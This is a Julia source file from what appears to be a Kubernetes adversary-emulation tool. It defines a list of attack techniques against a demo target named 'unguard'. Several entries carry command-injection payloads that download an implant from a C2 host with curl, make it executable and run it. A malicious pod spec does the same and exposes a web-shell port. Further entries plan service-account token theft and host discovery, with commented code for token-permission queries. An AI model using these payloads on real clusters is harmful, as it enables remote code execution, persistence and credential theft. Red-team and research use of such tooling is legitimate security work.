using StructTypes


Base.@kwdef struct ExploitParams 
    endpoint:: String
    params:: Dict
    method:: String
end

function defaul_id() :: String
    println("call default id gen")
    return string(rand(1:1000))
end


Base.@kwdef struct DeployPodParams 
    name:: String
    image:: String
    cmd:: Union{String,Nothing} = nothing
    args:: Vector{String} = []
    hostIPC:: Bool = false
    hostPID:: Bool = false
    hostNetwork:: Bool = false
    volume_mounts:: Vector{String} = []
    volumes:: Vector{String} = []
    ports:: Vector{Dict{String, Int}} = []
end

Base.@kwdef struct TTP 
    id:: Union{String, Nothing} = string(uuid4())
    technique :: String
    name :: String
    action :: Union{String, Nothing} = nothing
    cmd_args :: Union{String, Nothing} = nothing
    tactics :: Vector{String}
    ms_id :: String = ""
    execute :: Union{Function, Nothing} = nothing
    requires :: Union{Dict,Nothing} = Dict()
    params :: Union{ExploitParams, DeployPodParams, Nothing} = nothing
end

StructTypes.StructType(::Type{TTP}) = StructTypes.Mutable()
StructTypes.omitempties(::Type{TTP}) = true
StructTypes.excludes(::Type{TTP}) = (:execute, ) # exclude the execute function from serialization



function exploit_cmd_injection(ttp::TTP, target::String, c2::String)
    @error "Exploiting CMD injection not yet implemented"
end

function read_service_account_token(ttp::TTP, target::String, c2::String)
    @error "Read SA token not yet implemented"
end

function get_sa_token_permission()
    @error "getting SA token permission not yet implemented"
    # async def get_sa_token_permission(implant: Implant, sa_token: ServiceAccountToken | None = None) -> events.Event | None:
    # session = await implant.client.interact_session(implant.session_id)
    # # TODO currently requires cURL -are any pre-requisite checks requ has curl?
    # # - can download sth?
    # kind = "SelfSubjectRulesReview"
    # api_version = "authorization.k8s.io/v1"
    # body = {
    #     "kind": kind,
    #     "apiVersion": api_version,
    #     "spec": {"namespace": serviceaccount.token.namespace},
    #     # "metadata": {"creationTimestamp": None},
    #     # "status": {"resourceRules": None, "nonResourceRules": None, "incomplete": None},
    # }
    # args = [
    #     "-XPOST",
    #     "--cacert",
    #     CA_PATH,
    #     "-H",
    #     f"Authorization: Bearer {serviceaccount.token.raw}",
    #     "-H" "Accept: application/json, */*",
    #     "-H",
    #     "Content-Type: application/json",
    #     f"{serviceaccount.token.issuer}/apis/{api_version}/selfsubjectrulesreviews",
    #     # f"https://{api_server_ip}:{api_server_port}/apis/{api_version}/selfsubjectrulesreviews",
    #     "--data",
    #     json.dumps(body),
    # ]
    # res = await session.execute("curl", args=args)
    # if res.Status == 0:
    #     result = res.Stdout.decode('utf-8')
    #     rules_review = json.loads(result)
    #     return events.TokenCapabilitiesQueried(
    #         # TODO should the source system really be the system with the implant? this request could be done on any other pod as well
    #         source_system_id=implant.system_id,
    #         service_account=serviceaccount,
    #         resource_rules=rules_review["status"]["resourceRules"],
    #         non_resource_rules=rules_review["status"]["nonResourceRules"],
    #     )
    # else:
    #     reason = res.Stderr.decode('utf-8')
    #     msg = f"Could not retrieve permissions: {reason}"
    #     return events.UiEvent(type=events.EventType.Error, data=msg)
    return nothing
end

function read_environment_variables()
    @error "Read environment vars not yet implemented"
end

function list_available_binaries( kwargs...) :: Union{Event, Nothing}
    # session = await implant.client.interact_session(implant.session_id)
    # res = await session.execute('dpkg', args=["-l"])
    # stdout = res.Stdout.decode('utf-8')
    # binaries = {}
    # if stdout:
    #     for line in stdout.split("\n"):
    #         if line.startswith(('ii', 'hi', 'rc', 'pi', 'pu')):
    #             columns = line.split()
    #             if len(columns) >= 3:
    #                 state, name, version, *_ = columns
    #                 # if ':' in version:
    #                 #     _, version = version.split(':', 1)
    #                 # version = version.split('-', 1)[0]
    #                 binaries[name] = version

    # return events.SystemBinariesListed(source_system_id=implant.system_id, binaries=binaries)
    @error "Listing available binaries not yet implemented"
    return nothing
end

function deploy_pod()
    @error "Deploying pod not yet implemented"
    return nothing
end

function getArmory() :: Vector{TTP}
    return [
            TTP(
                name="Exploit Envoy Proxy CMD injection",
                tactics=[string(InitialAccess)],
                technique=string(ExploitPublicFacingApp),
                params=ExploitParams(
                    endpoint="http://unguard.kube/healthz",
                    params=Dict("path" => raw"127.0.0.1; curl $C2/static/bridge -o /tmp/b; chmod +x /tmp/b; /tmp/b &"),
                    method="GET",
                )
            ),
            TTP(
                name="Exploit Proxy Service CMD injection",
                tactics=[string(LateralMovement)],
                technique=string(ExploitationForPrivilegeEscalation),
                execute=exploit_cmd_injection,
                params=ExploitParams(
                    endpoint=raw"$TARGET/image",
                    params=Dict("url" => raw"127.0.0.1; curl $C2/static/bridge -o /tmp/b; chmod +x /tmp/b; /tmp/b &"),
                    method="GET",
                ),
            ),
            # TTP(
            #     name="Exploit Public-Facing Application",
            #     tactics=Tactic.InitialAccess,
            #     technique=Technique.ExploitPublicFacingApp,
            # ),
            TTP(
                name="Read Service Account Token",
                ms_id="MS-TA9016",
                technique=string(ContainerServiceAccount),  # MITRE would be StealApplicationAccessToken
                tactics=[string(CredentialAccess)],
                action="get_file",
                requires=Dict("accessLevel"=> UserRead),
                # consequence=["pod_name", "serviceaccount_name", "namespace name"],
                execute=read_service_account_token,
            ),
            TTP(
                name="Check ServiceAccount permissions",
                tactics=[string(Discovery)],
                technique=string(PermissionGroupsDiscovery_CloudGroups),  # TODO: not sure about this mapping
                requires=Dict("kind" => "ServiceAccount"),
                execute=get_sa_token_permission,
            ),
            # TTP(
            #     name="Container and Resource Discovery",
            #     tactics=Tactic.Discovery,
            #     technique=Technique.ContainerAndResourceDiscovery,
            # ),
            # TTP(name="Get working directory", tactics=Tactic.Discovery, technique="", action="pwd"),
            # TTP(name="List files", tactics=Tactic.Discovery, technique=Technique.FileAndDirectoryDiscovery, action="ls"),
            TTP(
                name="List environment variables",
                tactics=[string(Discovery)],
                technique=string(GatherVictimHostInformation),
                action="env",
                execute=read_environment_variables,
                requires=Dict("os"=> ["linux", "macOS"], "accessLevel"=> UserExecute),
            ),
            TTP(
                name="List binaries",
                tactics=[string(Discovery)],
                technique=string(GatherVictimHostInformation),
                execute=list_available_binaries,
                requires=Dict("os"=> "linux", "accessLevel"=> UserExecute),
            ),
            TTP(
                name="System Network Configuration Discovery",
                tactics=[string(Discovery)],
                technique=string(SystemNetworkConfigurationDiscovery),
                action="ifconfig",
                requires=Dict("kind" => "Pod", "accessLevel" => UserExecute),
            ),
            TTP(
                name="Deploy Container",
                tactics=[string(Execution)],
                technique=string(DeployContainer),
                # requires={"can": "create pods"},
                execute=deploy_pod,
                params=DeployPodParams(
                    name="Debug Pod",
                    image="r0binak/mtkpi:v1",
                    cmd= "/bin/bash",
                    args= ["-c", raw"curl $C2/static/bridge -o /tmp/b; chmod +x /tmp/b; /tmp/b"],
                    ports=[
                        Dict("containerPort" => 7681), # TTYD port for web shell, might be skipped
                    ],
                ),
            )
            # TTP(  # video for implementation KubeCon NA'23: https://www.youtube.com/watch?v=mqnm0AXoNgc
            #     # TODO implement
            #     name="Sidecar Injection",
            #     tactics=Tactic.Execution,
            #     technique=Technique.Deploycontainer,
            #     ms_id="MS-TA9011",
            #     requires=["role:can-patch-deployment"],
            # ),
        ]
end